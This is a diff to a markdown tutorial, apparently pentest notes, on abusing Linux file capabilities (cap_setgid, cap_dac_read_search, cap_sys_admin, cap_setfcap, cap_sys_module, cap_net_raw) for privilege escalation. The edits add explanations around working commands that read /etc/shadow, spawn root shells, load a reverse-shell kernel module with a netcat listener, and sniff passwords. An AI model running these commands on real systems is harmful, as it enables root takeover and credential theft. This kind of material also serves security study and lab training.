@@ -107,18 +107,21 @@ setcap cap_setgid+ep /usr/bin/python3.9
 
 #### Exploiting
 
+- by this we are checking group by which we can have power e.g suod or wheel, shadow 
 ```bash
 cat /etc/group
 ```
-
+- as we see the wheel group which will give us sudo rights, now we know the `gid` of the group
 ```bash
 wheel:x:10:
 ```
 
+- by using the gid we are assigning ourselves that group 
 ```bash
 python -c 'import os; os.setgid(10); os.system("/bin/bash")'
 ```
 
+- cuz we have sudo rights, by the command we will be root
 ```bash
 sudo su
 ```
@@ -145,6 +148,8 @@ setcap cap_dac_read_search+ep /usr/bin/python3.9
 
 
 #### Exploiting
+
+Using this capability if we found in tar and python we can read the sensitive system files shown below
 
 **tar**
 
@@ -175,6 +180,8 @@ python3 -c 'print(open("/etc/shadow").read())'
 ```
 
 ## cap_dac_override
+
+Using this capability we can read as well as write in the sensitive files
 
 #### Misconfiguring
 
@@ -216,7 +223,7 @@ setcap cap_sys_admin+ep /usr/bin/python3.9
 
 #### Exploiting
 
-we can't directly update the password in the **/etc/passwd** file, but I can perform a bind mount. Copy the /etc/passwd file to the current working directory (/home/armour) and make the changes in the root user password.
+we can't directly update the password in the **/etc/passwd** file, but we can perform a bind mount. Copy the /etc/passwd file to the current working directory (/home/armour) and make the changes in the root user password.
 
 ```bash
 cd /home/armour
@@ -336,6 +343,8 @@ setcap cap_setfcap+ep /usr/bin/python3.9
 
 #### Exploiting
 
+In this capability we can assign any capability to the file that we want,So we will assign ourself  [cap_setuid](#cap_setuid)
+
 - set the library to load for setcap
 ```python title:setcapability.py
 import ctypes
@@ -394,6 +403,7 @@ else:
 ```bash
 setcap cap_sys_module+ep /usr/bin/kmod
 ```
+If this capability is on kmod, It gives us power to load or unlaod kernel modules
 
 #### Exploiting
 
@@ -406,7 +416,7 @@ cd
 ```bash
 vim reverse-shell.c
 ```
-
+- our payload
 ```c title:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -463,6 +473,7 @@ make
 nc -nlvp 443
 ```
 
+- it will load the malicious kernel module, and gives us reverse shell
 ```bash
 insmod reverse-shell.ko #Launch the reverse shell
 ```
@@ -477,7 +488,7 @@ setcap cap_net_raw+ep /usr/sbin/tcpdump
 
 #### Exploiting
 
-- Maybe you can sniff the password
+- Although can't escalate, But in some case Maybe we can sniff the password
 ```bash
 tcpdump -n tcp
 ```
